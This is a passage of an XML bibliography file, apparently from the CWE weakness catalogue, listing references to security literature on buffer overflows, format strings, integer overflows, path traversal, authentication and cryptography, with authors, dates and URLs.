			<ns0:URL>http://www.owasp.org/index.php/ASP.NET_Misconfiguration:_Missing_Custom_Error_Handling</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-74">
			<ns0:Author>Jason Lam</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 3 - Classic Buffer Overflow</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>http://software-security.sans.org/blog/2010/03/02/top-25-series-rank-3-classic-buffer-overflow/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-76">
			<ns0:Author>Sean Barnum</ns0:Author>
			<ns0:Author>Michael Gegick</ns0:Author>
			<ns0:Title>Least Privilege</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20211209014121/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-90">
			<ns0:Title>Buffer UNDERFLOWS: What do you know about it?</ns0:Title>
			<ns0:Publication>Vuln-Dev Mailing List</ns0:Publication>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/vuln-dev/2004/Jan/22</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-96">
			<ns0:Author>Jason Lam</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 14 - Improper Validation of Array Index</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---12</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://web.archive.org/web/20100316064026/http://blogs.sans.org/appsecstreetfighter/2010/03/12/top-25-series-rank-14-improper-validation-of-array-index/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-103">
			<ns0:Author>Microsoft Corporation</ns0:Author>
			<ns0:Title>How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff647398(v=pandp.10)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-104">
			<ns0:Author>Microsoft Corporation</ns0:Author>
			<ns0:Title>How To: Encrypt Configuration Sections in ASP.NET 2.0 Using RSA</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff650304(v=pandp.10)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-105">
			<ns0:Author>Microsoft Corporation</ns0:Author>
			<ns0:Title>.NET Framework Developer's Guide - Securing Connection Strings</ns0:Title>
			<ns0:URL>http://msdn.microsoft.com/en-us/library/89211k9b(VS.80).aspx</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-106">
			<ns0:Author>David LeBlanc</ns0:Author>
			<ns0:Author>Niels Dekker</ns0:Author>
			<ns0:Title>SafeInt</ns0:Title>
			<ns0:URL>http://safeint.codeplex.com/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-107">
			<ns0:Author>Jason Lam</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 18 - Incorrect Calculation of Buffer Size</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>http://software-security.sans.org/blog/2010/03/19/top-25-series-rank-18-incorrect-calculation-of-buffer-size</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-116">
			<ns0:Author>Steve Christey</ns0:Author>
			<ns0:Title>Format String Vulnerabilities in Perl Programs</ns0:Title>
			<ns0:URL>https://seclists.org/fulldisclosure/2005/Dec/91</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-117">
			<ns0:Author>Hal Burch</ns0:Author>
			<ns0:Author>Robert C. Seacord</ns0:Author>
			<ns0:Title>Programming Language Format String Vulnerabilities</ns0:Title>
			<ns0:URL>https://drdobbs.com/security/programming-language-format-string-vulne/197002914</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-118">
			<ns0:Author>Tim Newsham</ns0:Author>
			<ns0:Title>Format String Attacks</ns0:Title>
			<ns0:Publication_Year>2000</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:Publisher>Guardent</ns0:Publisher>
			<ns0:URL>http://www.thenewsh.com/~newsham/format-string-attacks.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-124">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Title>When scrubbing secrets in memory doesn't work</ns0:Title>
			<ns0:Publication>BugTraq</ns0:Publication>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>http://cert.uni-stuttgart.de/archive/bugtraq/2002/11/msg00046.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-125">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Title>Some Bad News and Some Good News</ns0:Title>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---21</ns0:Publication_Day>
			<ns0:Publisher>Microsoft</ns0:Publisher>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions/ms972826(v=msdn.10)</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-126">
			<ns0:Author>Joseph Wagner</ns0:Author>
			<ns0:Title>GNU GCC: Optimizer Removes Code Necessary for Security</ns0:Title>
			<ns0:Publication>Bugtraq</ns0:Publication>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/bugtraq/2002/Nov/266</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-140">
			<ns0:Author>Greg Hoglund</ns0:Author>
			<ns0:Author>Gary McGraw</ns0:Author>
			<ns0:Title>Exploiting Software: How to Break Code</ns0:Title>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---27</ns0:Publication_Day>
			<ns0:Publisher>Addison-Wesley</ns0:Publisher>
			<ns0:URL>https://www.amazon.com/Exploiting-Software-How-Break-Code/dp/0201786958</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-141">
			<ns0:Author>Steve Christey</ns0:Author>
			<ns0:Title>Blacklist defenses as a breeding ground for vulnerability variants</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/fulldisclosure/2006/Feb/40</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-145">
			<ns0:Author>Yves Younan</ns0:Author>
			<ns0:Title>An overview of common programming security vulnerabilities and possible solutions</ns0:Title>
			<ns0:Publication>Student thesis section 5.4.3</ns0:Publication>
			<ns0:Publication_Year>2003</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:URL>http://fort-knox.org/thesis.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-146">
			<ns0:Author>blexim</ns0:Author>
			<ns0:Title>Basic Integer Overflows</ns0:Title>
			<ns0:Publication>Phrack - Issue 60, Chapter 10</ns0:Publication>
			<ns0:URL>http://www.phrack.org/issues.html?issue=60&amp;id=10#article</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-150">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 17 - Integer Overflow Or Wraparound</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>http://software-security.sans.org/blog/2010/03/18/top-25-series-rank-17-integer-overflow-or-wraparound</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-155">
			<ns0:Author>Halvar Flake</ns0:Author>
			<ns0:Title>Third Generation Exploits</ns0:Title>
			<ns0:Publication>presentation at Black Hat Europe 2001</ns0:Publication>
			<ns0:URL>https://view.officeapps.live.com/op/view.aspx?src=https%3A%2F%2Fwww.blackhat.com%2Fpresentations%2Fbh-europe-01%2Fhalvar-flake%2Fbh-europe-01-halvarflake.ppt&amp;wdOrigin=BROWSELINK</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-156">
			<ns0:Author>Steve Christey</ns0:Author>
			<ns0:Title>Off-by-one errors: a brief explanation</ns0:Title>
			<ns0:Publication>Secprog and SC-L mailing list posts</ns0:Publication>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>http://marc.info/?l=secprog&amp;m=108379742110553&amp;w=2</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-157">
			<ns0:Author>klog</ns0:Author>
			<ns0:Title>The Frame Pointer Overwrite</ns0:Title>
			<ns0:Publication>Phrack Issue 55, Chapter 8</ns0:Publication>
			<ns0:Publication_Year>1999</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:URL>https://kaizo.org/mirrors/phrack/phrack55/P55-08</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-161">
			<ns0:Author>John McDonald</ns0:Author>
			<ns0:Author>Mark Dowd</ns0:Author>
			<ns0:Author>Justin Schuh</ns0:Author>
			<ns0:Title>C Language Issues for Application Security</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>http://www.informit.com/articles/article.aspx?p=686170&amp;seqNum=6</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-162">
			<ns0:Author>Robert Seacord</ns0:Author>
			<ns0:Title>Integral Security</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://drdobbs.com/cpp/integral-security/193501774</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-166">
			<ns0:Author>Jim Manico</ns0:Author>
			<ns0:Title>Input Validation with ESAPI - Very Important</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://manicode.blogspot.com/2008/08/input-validation-with-esapi.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-168">
			<ns0:Author>Joel Scambray</ns0:Author>
			<ns0:Author>Mike Shema</ns0:Author>
			<ns0:Author>Caleb Sima</ns0:Author>
			<ns0:Title>Hacking Exposed Web Applications, Second Edition</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:Publisher>McGraw-Hill</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-170">
			<ns0:Author>Kevin Beaver</ns0:Author>
			<ns0:Title>The importance of input validation</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---06</ns0:Publication_Day>
			<ns0:URL>http://searchsoftwarequality.techtarget.com/tip/0,289483,sid92_gci1214373,00.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-172">
			<ns0:Author>Chris Wysopal</ns0:Author>
			<ns0:Title>Mobile App Top 10 List</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://www.veracode.com/blog/2010/12/mobile-app-top-10-list</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-174">
			<ns0:Author>Web Application Security Consortium</ns0:Author>
			<ns0:Title>Information Leakage</ns0:Title>
			<ns0:URL>http://projects.webappsec.org/w/page/13246936/Information%20Leakage</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-175">
			<ns0:Author>Brian Chess</ns0:Author>
			<ns0:Author>Jacob West</ns0:Author>
			<ns0:Title>Secure Programming with Static Analysis</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publisher>Addison-Wesley</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-176">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Author>David LeBlanc</ns0:Author>
			<ns0:Title>Writing Secure Code</ns0:Title>
			<ns0:Edition>1st Edition</ns0:Edition>
			<ns0:Publication_Year>2001</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:Publisher>Microsoft Press</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-179">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 16 - Information Exposure Through an Error Message</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---17</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>http://software-security.sans.org/blog/2010/03/17/top-25-series-rank-16-information-exposure-through-an-error-message</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-185">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Testing for Path Traversal (OWASP-AZ-001)</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-186">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 7 - Path Traversal</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-7-path-traversal/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-192">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>OWASP Attack listing</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/Relative_Path_Traversal</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-194">
			<ns0:Author>Herbert Schildt</ns0:Author>
			<ns0:Title>Herb Schildt's C++ Programming Cookbook</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:Publisher>McGraw-Hill Osborne Media</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-196">
			<ns0:Author>Jerome H. Saltzer</ns0:Author>
			<ns0:Author>Michael D. Schroeder</ns0:Author>
			<ns0:Title>The Protection of Information in Computer Systems</ns0:Title>
			<ns0:Publication>Proceedings of the IEEE 63</ns0:Publication>
			<ns0:Publication_Year>1975</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:URL>http://web.mit.edu/Saltzer/www/publications/protection/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-199">
			<ns0:Author>NIST</ns0:Author>
			<ns0:Title>United States Government Configuration Baseline (USGCB)</ns0:Title>
			<ns0:URL>https://csrc.nist.gov/Projects/United-States-Government-Configuration-Baseline</ns0:URL>
			<ns0:URL_Date>2023-03-28</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-207">
			<ns0:Author>John Viega</ns0:Author>
			<ns0:Author>Gary McGraw</ns0:Author>
			<ns0:Title>Building Secure Software: How to Avoid Security Problems the Right Way</ns0:Title>
			<ns0:Edition>1st Edition</ns0:Edition>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publisher>Addison-Wesley</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-229">
			<ns0:Author>NIST</ns0:Author>
			<ns0:Title>Role Based Access Control and Role Based Security</ns0:Title>
			<ns0:URL>https://csrc.nist.gov/projects/role-based-access-control</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-231">
			<ns0:Author>Frank Kim</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 5 - Improper Access Control (Authorization)</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-5-improper-access-control-authorization/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-233">
			<ns0:Author>Rahul Bhattacharjee</ns0:Author>
			<ns0:Title>Authentication using JAAS</ns0:Title>
			<ns0:URL>https://javaranch.com/journal/2008/04/authentication-using-JAAS.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-236">
			<ns0:Author>Kim Zetter</ns0:Author>
			<ns0:Title>Weak Password Brings 'Happiness' to Twitter Hacker</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:URL>https://www.wired.com/2009/01/professed-twitt/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-237">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Top 10 2007-Broken Authentication and Session Management</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:URL>http://www.owasp.org/index.php/Top_10_2007-A7</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-238">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Guide to Authentication</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/Guide_to_Authentication</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-239">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Authentication</ns0:Title>
			<ns0:URL>http://msdn.microsoft.com/en-us/library/aa374735(VS.85).aspx</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-243">
			<ns0:Author>Sascha Fahl, Marian Harbach, Thomas Muders, Matthew Smith</ns0:Author>
			<ns0:Author>Lars Baumg&#228;rtner, Bernd Freisleben</ns0:Author>
			<ns0:Title>Why Eve and Mallory Love Android: An Analysis of Android SSL (In)Security</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>http://www2.dcsec.uni-hannover.de/files/android/p50-fahl.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-244">
			<ns0:Author>M. Bishop</ns0:Author>
			<ns0:Title>Computer Security: Art and Science</ns0:Title>
			<ns0:Publication_Year>2003</ns0:Publication_Year>
			<ns0:Publisher>Addison-Wesley</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-245">
			<ns0:Author>Martin Georgiev</ns0:Author>
			<ns0:Author>Subodh Iyengar</ns0:Author>
			<ns0:Author>Suman Jana</ns0:Author>
			<ns0:Author>Rishita Anubhai</ns0:Author>
			<ns0:Author>Dan Boneh</ns0:Author>
			<ns0:Author>Vitaly Shmatikov</ns0:Author>
			<ns0:Title>The Most Dangerous Code in the World: Validating SSL Certificates in Non-Browser Software</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-249">
			<ns0:Author>Kenneth Ballard</ns0:Author>
			<ns0:Title>Secure programming with the OpenSSL API, Part 2: Secure handshake</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://developer.ibm.com/tutorials/l-openssl/?mhsrc=ibmsearch_a&amp;mhq=secure%20programming%20with%20the%20openssl%20API</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-250">
			<ns0:Author>Eric Rescorla</ns0:Author>
			<ns0:Title>An Introduction to OpenSSL Programming (Part I)</ns0:Title>
			<ns0:Publication_Year>2001</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://www.linuxjournal.com/article/4822</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-257">
			<ns0:Author>Frank Kim</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 19 - Missing Authentication for Critical Function</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-19-missing-authentication-for-critical-function/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-265">
			<ns0:Author>Frank Kim</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 10 - Missing Encryption of Sensitive Data</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-10-missing-encryption-of-sensitive-data/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-267">
			<ns0:Author>Information Technology Laboratory, National Institute of Standards and Technology</ns0:Author>
			<ns0:Title>SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES</ns0:Title>
			<ns0:Publication_Year>2001</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>https://csrc.nist.gov/csrc/media/publications/fips/140/2/final/documents/fips1402.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-271">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Top 10 2007-Insecure Communications</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:URL>http://www.owasp.org/index.php/Top_10_2007-A9</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-280">
			<ns0:Author>Bruce Schneier</ns0:Author>
			<ns0:Title>Applied Cryptography</ns0:Title>
			<ns0:Publication_Year>1996</ns0:Publication_Year>
			<ns0:Publisher>John Wiley &amp; Sons</ns0:Publisher>
			<ns0:URL>https://www.schneier.com/books/applied-cryptography</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-281">
			<ns0:Author>Alfred J. Menezes</ns0:Author>
			<ns0:Author>Paul C. van Oorschot</ns0:Author>
			<ns0:Author>Scott A. Vanstone</ns0:Author>
			<ns0:Title>Handbook of Applied Cryptography</ns0:Title>
			<ns0:Publication_Year>1996</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:URL>https://cacr.uwaterloo.ca/hac/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-282">
			<ns0:Author>C Matthew Curtin</ns0:Author>
			<ns0:Title>Avoiding bogus encryption products: Snake Oil FAQ</ns0:Title>
			<ns0:Publication_Year>1998</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:URL>http://www.faqs.org/faqs/cryptography-faq/snake-oil/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-284">
			<ns0:Author>Paul F. Roberts</ns0:Author>
			<ns0:Title>Microsoft Scraps Old Encryption in New Code</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://www.eweek.com/security/microsoft-scraps-old-encryption-in-new-code/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-287">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 24 - Use of a Broken or Risky Cryptographic Algorithm</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-use-of-a-broken-or-risky-cryptographic-algorithm/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-289">
			<ns0:Author>Alexander Sotirov et al.</ns0:Author>
			<ns0:Title>MD5 considered harmful today</ns0:Title>
			<ns0:URL>http://www.phreedom.org/research/rogue-ca/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-291">
			<ns0:Author>Johnny Shelley</ns0:Author>
			<ns0:Title>bcrypt</ns0:Title>
